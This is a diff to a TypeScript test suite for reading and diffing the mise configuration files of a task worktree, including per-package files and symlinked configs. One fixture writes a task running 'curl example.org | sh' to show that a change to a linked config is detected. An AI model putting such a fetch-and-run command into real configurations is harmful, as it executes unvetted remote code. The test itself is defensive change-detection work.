@@ -29,7 +29,6 @@ describe("the mise config of a task worktree (ADR-59)", () => {
       "mise-tasks/db/migrate": "#!/bin/sh\n",
       "mise/config.toml": "[tasks]\n",
       "README.md": "#\n",
-      "src/mise.toml": "[tools]\n",
       ".config/other.toml": "x\n",
       "build.gradle": "plugins {}\n",
     });
@@ -44,6 +43,27 @@ describe("the mise config of a task worktree (ADR-59)", () => {
       "mise.dev.toml",
       "mise.toml",
       "mise/config.toml",
+    ]);
+  });
+
+  test("it has the mise files of each package below the root (ADR-305), but none from dependencies, build output or hidden folders", async () => {
+    const dir = worktreeWith({
+      "mise.toml": "[tools]\n",
+      "packages/client/mise.toml": "[tasks.test]\n",
+      "packages/client/mise.local.toml": "[env]\n",
+      "packages/client/mise-tasks/seed": "#!/bin/sh\n",
+      "packages/client/src/App.ts": "export {}\n",
+      "node_modules/some-lib/mise.toml": "[tasks.x]\n",
+      "packages/client/target/mise.toml": "[tasks.x]\n",
+      ".github/mise.toml": "[tasks.x]\n",
+      "packages/admin/README.md": "#\n",
+    });
+
+    expect(Object.keys(await readMiseConfig(dir))).toEqual([
+      "mise.toml",
+      "packages/client/mise-tasks/seed",
+      "packages/client/mise.local.toml",
+      "packages/client/mise.toml",
     ]);
   });
 
@@ -82,11 +102,11 @@ describe("the mise config of a task worktree (ADR-59)", () => {
   test.skipIf(process.platform === "win32")(
     "a linked file counts by its target inside the worktree, so a change to the target is a change",
     async () => {
-      const dir = worktreeWith({ "config/mise.toml": "[tasks]\n" });
-      symlinkSync(join("config", "mise.toml"), join(dir, "mise.toml"));
+      const dir = worktreeWith({ "config/shared-mise-config": "[tasks]\n" });
+      symlinkSync(join("config", "shared-mise-config"), join(dir, "mise.toml"));
       const before = await readMiseConfig(dir);
 
-      writeFileSync(join(dir, "config", "mise.toml"), '[tasks.test]\nrun = "curl example.org | sh"\n');
+      writeFileSync(join(dir, "config", "shared-mise-config"), '[tasks.test]\nrun = "curl example.org | sh"\n');
       expect(Object.keys(before)).toEqual(["mise.toml"]);
       expect(miseConfigChanges(before, await readMiseConfig(dir))).toEqual([{ path: "mise.toml", change: "modified" }]);
     },
